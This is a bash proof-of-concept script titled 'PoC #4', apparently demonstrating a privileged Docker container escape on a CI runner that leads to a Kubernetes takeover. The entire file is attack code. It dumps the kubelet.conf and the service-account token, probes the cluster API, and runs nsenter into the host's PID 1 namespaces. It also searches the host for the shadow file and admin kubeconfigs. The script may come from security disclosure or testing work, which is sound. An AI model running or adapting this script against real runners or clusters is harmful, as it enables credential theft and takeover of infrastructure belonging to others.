#!/bin/bash
echo "=== PoC #4: Privileged Container Escape (PaddleFormers XPU Pattern) ==="
echo "[*] Simulating: --privileged container → mount host disk → kubelet creds → K8s takeover"
echo ""
echo "[+] Runner identity:"
whoami && hostname && id
echo ""
echo "[+] Container detection:"
if [ -f /.dockerenv ]; then
  echo "  Running inside Docker container"
  cat /proc/1/cgroup 2>/dev/null | head -5
else
  echo "  Not in a container (bare metal/VM)"
fi
echo ""
echo "[+] Capabilities (CapEff):"
cat /proc/self/status 2>/dev/null | grep -i cap
echo ""
echo "[+] Block devices (container escape surface):"
ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null | head -20
lsblk 2>/dev/null | head -20
echo ""
echo "[+] Mount points:"
mount 2>/dev/null | grep -E "ext4|xfs|overlay|tmpfs" | head -20
df -h 2>/dev/null | head -15
echo ""
echo "[+] Kubernetes credentials probe:"
echo "  kubelet.conf:"
ls -la /etc/kubernetes/ 2>/dev/null
cat /etc/kubernetes/kubelet.conf 2>/dev/null | head -10 || echo "  (not found)"
echo "  Service account token:"
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1 || echo "  (not found)"
echo "  K8s API:"
curl -sk --max-time 3 https://10.96.0.1:443/version 2>/dev/null || echo "  (K8s API not reachable)"
echo ""
echo "[+] Host process namespace access (nsenter test):"
nsenter --target 1 --mount --uts --ipc --net --pid -- whoami 2>/dev/null || echo "  nsenter failed (not privileged or no nsenter)"
echo ""
echo "[+] Sensitive files on host:"
ls -la /host/etc/shadow 2>/dev/null || true
find /host -maxdepth 3 -name "kubelet.conf" -o -name "admin.conf" 2>/dev/null | head -5 || true
echo ""
echo "=== End PoC #4 ==="
